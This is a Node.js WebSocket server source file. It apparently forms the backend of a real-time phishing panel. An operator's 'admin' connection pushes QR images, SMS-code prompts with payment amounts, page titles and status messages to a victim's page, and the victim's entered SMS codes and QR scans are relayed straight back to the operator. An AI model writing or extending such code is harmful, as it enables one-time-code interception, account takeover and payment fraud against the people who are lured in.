import { WebSocketServer } from 'ws'
import pool from './db.js'

const clients = new Map()

function clientKey(sessionId, role) { return `${sessionId}:${role}` }

function sendTo(sessionId, role, data) {
  const key = clientKey(sessionId, role)
  const ws = clients.get(key)
  if (ws && ws.readyState === 1) {
    ws.send(JSON.stringify(data))
  } else {
    console.log(`[WS] No ${role} connected for session ${sessionId.slice(0,8)}`)
  }
}

export function setupWebSocket(server) {
  const wss = new WebSocketServer({ server })

  wss.on('connection', (ws, req) => {
    const url = new URL(req.url, `http://${req.headers.host}`)
    const sessionId = url.searchParams.get('sessionId')
    const role = url.searchParams.get('role')

    if (!sessionId || !role) { ws.close(4000, 'Missing params'); return }

    clients.set(clientKey(sessionId, role), ws)
    console.log(`[WS] ${role} connected → ${sessionId.slice(0, 8)} (total: ${clients.size})`)

    ws.on('close', () => {
      clients.delete(clientKey(sessionId, role))
      console.log(`[WS] ${role} disconnected → ${sessionId.slice(0, 8)} (total: ${clients.size})`)
    })

    ws.on('message', async (raw) => {
      try {
        const msg = JSON.parse(raw.toString())

        if (role === 'admin') {
          if (msg.type === 'qr-show') {
            await pool.query(`UPDATE sessions SET qr_visible = true, updated_at = NOW() WHERE session_id = $1`, [sessionId])
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'qr_shown', 'Admin started screen share')`, [sessionId])
            sendTo(sessionId, 'user', { type: 'qr-show' })
          }

          if (msg.type === 'qr-hide') {
            await pool.query(`UPDATE sessions SET qr_visible = false, updated_at = NOW() WHERE session_id = $1`, [sessionId])
            sendTo(sessionId, 'user', { type: 'qr-hide' })
          }

          if (msg.type === 'qr-image') {
            await pool.query(`UPDATE sessions SET qr_image = $1, updated_at = NOW() WHERE session_id = $2`, [msg.image, sessionId])
            sendTo(sessionId, 'user', { type: 'qr-image', image: msg.image })
          }

          if (msg.type === 'sms-code') {
            const codeLength = msg.codeLength || 6
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_sent', $2)`, [sessionId, `SMS activated: ${codeLength} digits, amount: ${msg.amount || 'none'}, text: ${msg.displayText || 'none'}`])
            sendTo(sessionId, 'user', { type: 'sms-activate', codeLength, amount: msg.amount || null, displayText: msg.displayText || null })
            console.log(`[WS] SMS sent to user: codeLength=${codeLength} amount=${msg.amount} displayText=${msg.displayText}`)
          }

          if (msg.type === 'status-toggle') {
            const { field, value } = msg
            if (['sms_active', 'otp_active', 'kode_active'].includes(field)) {
              await pool.query(`UPDATE sessions SET ${field} = $1, updated_at = NOW() WHERE session_id = $2`, [value, sessionId])
              sendTo(sessionId, 'admin', { type: 'status-changed', field, value })
              sendTo(sessionId, 'user', { type: 'status-toggle', field, value })
            }
          }

          if (msg.type === 'verified') {
            await pool.query(`UPDATE sessions SET status = 'verified', verified_at = NOW(), updated_at = NOW() WHERE session_id = $1`, [sessionId])
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'verified', 'Admin verified')`, [sessionId])
            sendTo(sessionId, 'user', { type: 'verified' })
          }

          if (msg.type === 'title-change') {
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'title_changed', $2)`, [sessionId, msg.title])
            sendTo(sessionId, 'user', { type: 'title-change', title: msg.title })
            console.log(`[WS] Title changed → user: "${msg.title}"`)
          }

          if (msg.type === 'broadcast-message') {
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'broadcast_sent', $2)`, [sessionId, msg.message])
            sendTo(sessionId, 'user', { type: 'broadcast-message', message: msg.message })
            console.log(`[WS] Broadcast sent → user: "${msg.message}"`)
          }

          if (msg.type === 'message-type') {
            await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'msg_type_changed', $2)`, [sessionId, `${msg.messageType}: ${msg.text}`])
            sendTo(sessionId, 'user', { type: 'message-type', messageType: msg.messageType, text: msg.text })
            console.log(`[WS] Message type → user: ${msg.messageType}: ${msg.text}`)
          }

          if (msg.type === 'broadcast-toggle') {
            sendTo(sessionId, 'user', { type: 'broadcast-toggle', enabled: msg.enabled })
          }

          if (msg.type === 'admin-left') {
            sendTo(sessionId, 'user', { type: 'admin-left' })
            console.log(`[WS] Admin left session ${sessionId.slice(0,8)}`)
          }

          if (msg.type === 'admin-approve') {
            sendTo(sessionId, 'user', { type: 'approved' })
            console.log(`[WS] Admin approved session ${sessionId.slice(0,8)}`)
          }
        }

        if (role === 'user' && msg.type === 'verified') {
          await pool.query(`UPDATE sessions SET status = 'verified', verified_at = NOW(), updated_at = NOW() WHERE session_id = $1`, [sessionId])
          await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'verified', 'QR scanned by user')`, [sessionId])
          sendTo(sessionId, 'admin', { type: 'user-verified' })
          sendTo(sessionId, 'user', { type: 'verified' })
        }

        if (role === 'user' && msg.type === 'sms-submitted') {
          await pool.query(`INSERT INTO auth_log (session_id, event_type, detail) VALUES ($1, 'sms_submitted', $2)`, [sessionId, `Code: ${msg.code}`])
          sendTo(sessionId, 'admin', { type: 'sms-submitted', code: msg.code, session_id: sessionId })
          console.log(`[WS] SMS submitted by user: code=${msg.code}`)
        }
      } catch (err) { console.error('WS error:', err) }
    })
  })

  return wss
}
